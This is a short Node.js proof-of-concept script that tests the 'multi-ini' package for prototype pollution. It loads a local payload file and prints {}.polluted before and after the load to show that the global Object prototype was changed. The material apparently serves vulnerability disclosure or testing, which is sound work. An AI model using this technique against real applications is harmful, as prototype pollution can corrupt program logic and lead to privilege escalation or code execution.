var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const ini = require('multi-ini');
const path = require('path');
console.log({}.polluted);
ini.read(path.resolve(__dirname, './payload.toml'), { encoding: 'utf8' });
console.log({}.polluted);